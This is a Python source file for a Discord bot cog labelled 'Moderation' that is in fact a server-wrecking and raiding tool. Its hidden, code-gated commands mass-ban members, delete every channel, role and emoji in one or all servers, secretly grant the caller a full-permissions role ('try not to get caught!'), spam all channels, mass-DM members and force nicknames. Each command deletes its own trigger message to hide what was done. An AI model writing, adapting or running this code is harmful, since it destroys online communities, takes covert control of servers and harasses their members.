# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).


# Modules.

import discord
import random
import os
from cogs.seth_methods import CODE, check_for_servers, refresh, command_error
from discord.ext import commands
from colorama import Fore, init
init()


class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Nuke the server.

    @commands.command(hidden=True)
    async def nuke(self, ctx, code=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("nuke")
                return
            quotes = [
                "War is peace, freedom is slavery and ignorance is strength.",
                "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.",
                "The object of war is not die for your country but to make the other bastard die for his.",
                "War does not determine who are right - only those who are left.",
                "If you are far from the enemy, make them think you are near.",
                "Only the dead have seen the end of war.",
                "Older men declare war, but it is the youth that must fight and die.",
                "War is the teacher of violence.",
                "If you know the enemy and know yourself, you need not fear the result of a hundred battles."]
            quote = quotes[random.randint(0, len(quotes) - 1)]

            # Ban all members.

            print(
                f"{Fore.LIGHTWHITE_EX}\n\n{'-'*(len(quote)+2)}\nNuke depolyed!\n\n{Fore.RESET}")
            print(f"{Fore.YELLOW}Banning server members:{Fore.RESET}")
            for member in g.members:
                try:
                    if member != ctx.author:
                        await member.ban(reason=None, delete_message_days=7)
                        print(
                            f"{Fore.LIGHTBLUE_EX}Banned {member}.{Fore.RESET}")
                    else:
                        print(f"{Fore.YELLOW}You are immune!")
                except discord.Forbidden:
                    print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                except discord.HTTPException:
                    print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
            print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")

            # Delete all channels.

            print(f"{Fore.YELLOW}Deleting server channels:{Fore.RESET}")
            for c in g.channels:
                try:
                    await c.delete()
                    print(
                        f'{Fore.LIGHTBLUE_EX}Channel \"{c}\" deleted.{Fore.RESET}')
                except discord.Forbidden:
                    print(
                        f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                except discord.HTTPException:
                    print(
                        f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
            print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")

            # Delete all roles.

            print(f"{Fore.YELLOW}Deleting server roles:{Fore.RESET}")
            roles = g.roles
            roles.pop(0)
            for role in roles:
                if g.me.roles[-1] > role:
                    try:
                        await role.delete()
                        print(
                            f'{Fore.LIGHTBLUE_EX}Role \"{role}\" deleted.{Fore.RESET}')
                    except discord.Forbidden:
                        print(
                            f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                    except discord.HTTPException:
                        print(
                            f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                else:
                    break
            print(f"{Fore.LIGHTGREEN_EX}Deleted all roles.\n{Fore.RESET}")

            # Delete all emojis.

            print(f"{Fore.YELLOW}Deleting server emojis:{Fore.RESET}")
            for emoji in list(g.emojis):
                try:
                    await emoji.delete()
                    print(
                        f"{Fore.LIGHTBLUE_EX}Emoji \"{emoji.name}\" deleted.{Fore.RESET}")
                except BaseException:
                    print(
                        f"{Fore.RED}Failed to delete emoji \"{emoji.name}\".{Fore.RESET}")
            print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n\n{Fore.RESET}")

            print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Nuke every server.

    @commands.command(hidden=True)
    async def mass_nuke(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("mass_nuke")
                return
            i = 1
            k = len(self.bot.guilds)
            quotes = [
                "War is peace, freedom is slavery and ignorance is strength.",
                "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.",
                "The object of war is not die for your country but to make the other bastard die for his.",
                "War does not determine who are right - only those who are left.",
                "If you are far from the enemy, make them think you are near.",
                "Only the dead have seen the end of war.",
                "Older men declare war, but it is the youth that must fight and die.",
                "War is the teacher of violence.",
                "If you know the enemy and know yourself, you need not fear the result of a hundred battles."]
            quote = quotes[random.randint(0, len(quotes) - 1)]

            for g in self.bot.guilds:
                # Ban all members.
                print(f"{Fore.LIGHTWHITE_EX}\n\n{'-'*(len(str(g))+43)}\nServers nuked: {i}/{k}\nWarhead fired at server: {Fore.LIGHTRED_EX}\"{g}\"{Fore.LIGHTWHITE_EX}!\n{'-'*(len(str(g))+43)}\n{Fore.RESET}")
                print(
                    f"{Fore.YELLOW}Banning server members from server: \"{g}\":{Fore.RESET}")
                for member in g.members:
                    try:
                        if member != ctx.author:
                            await member.ban(reason=None, delete_message_days=7)
                            print(
                                f"{Fore.LIGHTBLUE_EX}Banned {member}.{Fore.RESET}")
                        else:
                            print(f"{Fore.YELLOW}You are immune!")
                    except discord.Forbidden:
                        print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                    except discord.HTTPException:
                        print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")

                # Delete all channels.
                print(
                    Fore.YELLOW +
                    f"Deleting server channels from server: \"{g}\":{Fore.RESET}")
                for c in g.channels:
                    try:
                        await c.delete()
                        print(
                            f'{Fore.LIGHTBLUE_EX}Channel \"{c}\" deleted.{Fore.RESET}')
                    except discord.Forbidden:
                        print(
                            f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                    except discord.HTTPException:
                        print(
                            f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")

                # Delete all roles.
                print(
                    Fore.YELLOW +
                    f"Deleting server roles from server: \"{g}\":{Fore.RESET}")
                roles = g.roles
                roles.pop(0)
                for role in roles:
                    if g.me.roles[-1] > role:
                        try:
                            await role.delete()
                            print(
                                f'{Fore.LIGHTBLUE_EX}Role \"{role}\" deleted.{Fore.RESET}')
                        except discord.Forbidden:
                            print(
                                f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                        except discord.HTTPException:
                            print(
                                f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                    else:
                        break
                print(f"{Fore.LIGHTGREEN_EX}Deleted all roles.\n{Fore.RESET}")

                # Delete all emojis.
                print(
                    Fore.YELLOW +
                    f"Deleting server emojis from server \"{g}\":{Fore.RESET}")
                for emoji in list(g.emojis):
                    try:
                        await emoji.delete()
                        print(
                            f"{Fore.LIGHTBLUE_EX}Emoji \"{emoji.name}\" deleted.{Fore.RESET}")
                    except BaseException:
                        print(
                            f"{Fore.RED}Failed to delete emoji \"{emoji.name}\".{Fore.RESET}")
                print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n{Fore.RESET}")

                print(f"{Fore.LIGHTWHITE_EX}Warhead sucessfully exploded at server: {Fore.LIGHTRED_EX}\"{g}\"{Fore.LIGHTWHITE_EX}!\n{'-'*(len(str(g))+43)}\n{Fore.RESET}")
                i += 1
            print(f"{Fore.LIGHTWHITE_EX}All warheads fired.\n{Fore.RED}{quote}{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote))}\n{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Delete all channels only.

    @commands.command(hidden=True)
    async def cpurge(self, ctx, code=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("cpurge")
                return
            print(f"\n\n{Fore.LIGHTWHITE_EX}Purging channels from server: {g}.")
            for c in g.channels:
                try:
                    await c.delete()
                    print(f"{Fore.LIGHTBLUE_EX}Channel {c} purged.")
                except:
                    print(f"{Fore.RED}Failed to purge channel {c}.")
            print(f"{Fore.LIGHTGREEN_EX}\nChannels purged from server: {g} successfully.{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Message all members with a message.

    @commands.command(hidden=True)
    async def mass_dm(self, ctx, code=None, *, message=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("mass_dm")
                return
            for member in g.members:
                try:
                    print(f"{Fore.LIGHTWHITE_EX}Messaging all members from server: {g}.")
                    if member.dm_channel is not None:
                        await member.dm_channel.send(message)
                        print(f"{Fore.LIGHTBLUE_EX}Messaged {member}.")
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(message)
                        print(f"{Fore.LIGHTBLUE_EX}Messaged {member}.")
                except BaseException:
                    print(f'{Fore.RED}Failed to message {member}.')
                    continue
            print(
                f"{Fore.LIGHTGREEN_EX}\nMessaged all members from server: {g} successfully.")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Make yourself an administator on the server.

    @commands.command(hidden=True)
    async def admin(self, ctx, code=None, *, role_name=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("admin")
                return
            if role_name is not None:
                await g.create_role(name=role_name, permissions=discord.Permissions.all())
                role = discord.utils.get(g.roles, name=role_name)
                await ctx.author.add_roles(role)
                print(
                    f"{Fore.LIGHTGREEN_EX}\nAdministrator permissions granted successfully - try not to get caught!{Fore.RESET}")
                return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Spam all text channels with a message.

    @commands.command(hidden=True)
    async def spam(self, ctx, code=None, *, message=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("spam")
                return
            if message is not None:
                print(f"{Fore.LIGHTBLUE_EX}\nSpamming started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the spamming.{Fore.RESET}")

                def check_reply(message):
                    return message.content == 'stop' and message.author == ctx.author

                async def spam_text():
                    while True:
                        for channel in g.text_channels:
                            await channel.send(message)

                spam_task = self.bot.loop.create_task(spam_text())
                await self.bot.wait_for('message', check=check_reply)
                spam_task.cancel()
                print(
                    f"{Fore.LIGHTGREEN_EX}Spamming finished successfully.{Fore.RESET}")
                return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Change the nickname of every member.

    @commands.command(hidden=True)
    async def mass_nick(self, ctx, code=None, *, nickname=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            print(f"{Fore.LIGHTWHITE_EX}Nicknaming all members from server: {g}.")
            if int(code) != int(CODE):
                command_error("mass_nick")
                return
            if nickname.strip().replace(' ', ''):
                for member in g.members:
                    try:
                        await member.edit(nick=nickname)
                        print(f"{Fore.LIGHTBLUE_EX}Nicknamed {member}.")
                    except BaseException:
                        print(f"{Fore.RED}Failed to nickname {member}.")
                print(
                    f"{Fore.LIGHTGREEN_EX}\nNicknamed all members from server: {g} successfully.{Fore.RESET}")
                return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Raid the server.

    @commands.command(hidden=True)
    async def raid(self, ctx, code=None, rolename=None, nickname=None, channelName=None, channelNum=None, *, msg=None):
        ID = ctx.message.guild.id
        await ctx.message.delete()
        g = discord.utils.get(self.bot.guilds, id=ID)
        try:
            if int(code) != int(CODE):
                command_error("raid")
                return
            if not code or not rolename or not nickname or not channelName or not channelNum or not msg:
                command_error("raid")
                return
            channelNum = int(channelNum)

            # Delete all channels.

            for c in g.channels:
                try:
                    await c.delete()
                except discord.Forbidden:
                    continue

            # Delete all roles.

            roles = g.roles
            roles.pop(0)
            for r in roles:
                if g.me.roles[-1] > r:
                    try:
                        await r.delete()
                    except BaseException:
                        continue
                else:
                    break

            # Create a new role and give it to all members.

            await g.create_role(name=rolename, colour=discord.Colour(0xff0000))
            role = discord.utils.get(g.roles, name=rolename)
            for member in g.members:
                try:
                    await member.add_roles(role)
                except BaseException:
                    continue

            # Nickname all members.

            for member in g.members:
                try:
                    await member.edit(nick=nickname)
                except BaseException:
                    continue

            # Create i number of channels named <channelNum>.

            for i in range(channelNum):
                try:
                    await g.create_text_channel(channelName)
                except BaseException:
                    continue

            # Message all members with a message.

            for member in g.members:
                try:
                    if member.dm_channel is not None:
                        await member.dm_channel.send(msg)
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(msg)
                except BaseException:
                    continue

            # Raid all text channels.

            print(f"{Fore.LIGHTBLUE_EX}Raiding started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the raiding.{Fore.RESET}")

            def check_reply(message):
                return message.content == 'stop' and message.author == ctx.author

            async def spam_text():
                while True:
                    for channel in g.text_channels:
                        await channel.send(msg)

            spam_task = self.bot.loop.create_task(spam_text())
            await self.bot.wait_for('message', check=check_reply)
            spam_task.cancel()
            print(f"{Fore.LIGHTGREEN_EX}Raiding finished successfully.{Fore.RESET}")
            return
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return

    # Leave all servers.

    @commands.command(hidden=True)
    async def mass_leave(self, ctx, *, code=None):
        await ctx.message.delete()
        print(f"\n\n{Fore.RED}WARNING: By confirming this command, your account will leave every server it has joined whilst Seth has been running.\n{Fore.WHITE}Enter CONFIRM to confirm: {Fore.YELLOW}")
        choice = input()
        if choice != "CONFIRM":
            refresh()
            return
        else:
            try:
                check_for_servers()

                if int(code) != int(CODE):
                    command_error("mass_leave")
                    return

                with open("cogs/servers.txt", "r") as f:
                    IDs = f.read().split("\n")
                    for ID in IDs:
                        try:
                            ID = int(ID)
                            await self.bot.get_guild(ID).leave()
                        except BaseException:
                            pass
                    f.close()
                os.remove("cogs/servers.txt")
                with open("cogs/servers.txt", "w") as f:
                    f.close()
                print(
                    f"{Fore.LIGHTGREEN_EX}You have successfully left all servers.{Fore.RESET}")
                return
            except BaseException as e:
                print(f"{Fore.LIGHTRED_EX}{e}\n\n")
                return

    # Refresh the window.

    @commands.command(hidden=True)
    async def refresh(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("refresh")
                return
            refresh()
        except BaseException as e:
            print(f"{Fore.LIGHTRED_EX}{e}\n\n")
            return


def setup(bot):
    bot.add_cog(Moderation(bot))


# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).
